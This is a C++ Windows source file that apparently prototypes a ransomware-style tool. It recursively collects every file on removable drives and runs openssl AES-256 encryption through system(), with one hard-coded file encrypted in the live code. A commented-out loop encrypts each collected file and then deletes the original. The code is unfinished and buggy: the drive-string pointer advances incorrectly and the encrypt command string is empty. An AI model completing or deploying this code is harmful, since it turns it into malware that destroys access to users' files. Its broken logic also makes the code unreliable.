#include<Windows.h>
#include <iostream>
#include<filesystem>
#include<tchar.h>
#include<vector>
#include <atlstr.h>
#include<fstream>
#include<iterator>
#include<cstdio>

#include<openssl/sha.h>


namespace filesystem = std::filesystem;

//void get_files(std::vector<std::string>& paths, std::string root_path)
//{
//
//	for (const auto& file : filesystem::directory_iterator(root_path))
//	{
//		if (filesystem::is_directory(file))
//		{
//			get_files(paths, file.path().string());
//		}
//	}
//}

void get_files(std::vector<std::string>& paths, LPCTSTR root_path)
{
	CStringA stringA(root_path);
	const char* const_char_root_path = stringA;
	char* char_root_path = const_cast<char*>(const_char_root_path);
	for (const auto& file : filesystem::directory_iterator(const_char_root_path))
	{
		if (filesystem::is_directory(file))
		{
			get_files(paths, file.path().string().c_str());
		}
		else
		{
			paths.push_back(file.path().string());
		}
	}
}

void fill_paths(std::vector<std::string>& paths)
{
	TCHAR sz_buffer[256];
	LPCTSTR buffer_ptr = sz_buffer;
	GetLogicalDriveStrings(255, sz_buffer);

	for (buffer_ptr; *buffer_ptr != '\0'; buffer_ptr += _tcsclen(sz_buffer) + 1)
	{
		if (GetDriveType(buffer_ptr) == DRIVE_REMOVABLE)
		{
			get_files(paths, buffer_ptr);
		}
	}
}
int main()
{
	std::vector<std::string> paths;

	//system("C://ZeD_Crypto//test.txt -out C://ZeD_Crypto//test.txt -pass passwd.txt"); //-"openssl aes-256-cbc -a -salt -pbkdf2 -in C://ZeD_Crypto//test.txt -out C://ZeD_Crypto//testenc.txt"
	
	 std::string ENCRYPT_COMMAND = " ";
	 std::string DECRYPT_COMMAND = "openssl aes-256-cbc -d -a -salt -pbkdf2 ";

	  fill_paths(paths);
	
	  system("openssl aes-256-cbc -a -salt -pbkdf2 -in W://very_important_dir//very_important_subdir//not_super_important_dir//secret2//filefilefileencrypnewnew.txt -out W://very_important_dir//very_important_subdir//not_super_important_dir//secret2//filefilefileencrypnewnew.encr");
	//for (size_t i = 2; i < paths.size(); ++i)
	//{
	//	ENCRYPT_COMMAND += "-in " + paths[i] + " -out " + paths[i].erase(paths[i].find_last_of('.'), paths[i].size()) + ".encr";
	//	system(ENCRYPT_COMMAND.c_str());
	//	remove(paths[i].c_str());
	//}

	
}


